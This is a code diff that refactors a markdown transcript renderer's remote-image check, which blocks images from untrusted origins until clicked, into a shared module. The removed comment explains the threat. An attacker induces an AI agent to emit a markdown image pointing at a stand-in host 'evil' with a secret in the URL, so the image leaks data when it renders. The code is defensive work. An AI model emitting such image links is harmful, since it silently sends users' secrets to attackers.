@@ -10,6 +10,7 @@ import { tryRenderCanvas, tryRenderHtmlMessage } from "../HtmlSnippet";
 import { tryRenderCastDiff } from "../InlineDiff";
 import { entityRemarkPlugins } from "../../lib/remarkEntityIds";
 import { EntityAwareCode, EntityAwareLink } from "../EntityIdPill";
+import { isRemoteImageSrc } from "../../lib/trustedImageOrigins";
 
 function extractTextFromHast(node: any): string {
   if (!node) return '';
@@ -67,42 +68,8 @@ function remarkSanitizeInvisibleUnicode() {
 
 // ---------------------------------------------------------------------------
 // Security control: never auto-fetch remote images in a rendered transcript.
-//
-// A markdown image auto-loads the instant it renders: the browser GETs the src
-// with no click. That is a silent exfiltration channel — an attacker who gets
-// the agent to emit ![x](https://evil/px?c=<secret>) (one signed pixel per
-// secret character) beacons data out to teammates and to public share-link
-// visitors with zero interaction (the EchoLeak / CamoLeak class).
-//
-// Local paths, data:/blob: URIs, and our own Convex storage host (where
-// legitimate pasted/uploaded transcript images live, served via getImageUrl)
-// reach no third party, so they render immediately. Every other http(s) origin
-// is held behind an explicit click-to-load.
-const TRUSTED_IMAGE_ORIGINS: Set<string> = (() => {
-  const origins = new Set<string>();
-  try { origins.add(window.location.origin); } catch { /* non-browser */ }
-  try {
-    const convexUrl = import.meta.env.VITE_CONVEX_URL;
-    if (convexUrl) origins.add(new URL(convexUrl).origin);
-  } catch { /* malformed/unset env */ }
-  return origins;
-})();
-
-function isRemoteImageSrc(src: string): boolean {
-  // Inline data / local object URLs never touch a third party.
-  if (/^(data:|blob:)/i.test(src)) return false;
-  // Relative or root-relative path — resolves against our own origin. A
-  // protocol-relative "//host/…" has no scheme but IS remote, so let it fall
-  // through to URL parsing below.
-  if (!/^[a-z][a-z0-9+.-]*:/i.test(src) && !src.startsWith('//')) return false;
-  try {
-    const url = new URL(src, window.location.href);
-    if (url.protocol !== 'http:' && url.protocol !== 'https:') return false;
-    return !TRUSTED_IMAGE_ORIGINS.has(url.origin);
-  } catch {
-    return true; // unparseable absolute reference → treat as untrusted
-  }
-}
+// Trust policy (which origins are "ours") lives in lib/trustedImageOrigins,
+// shared with the cast-canvas sanitizer; here it drives the click-to-load gate.
 
 interface MarkdownRendererProps {
   content: string;
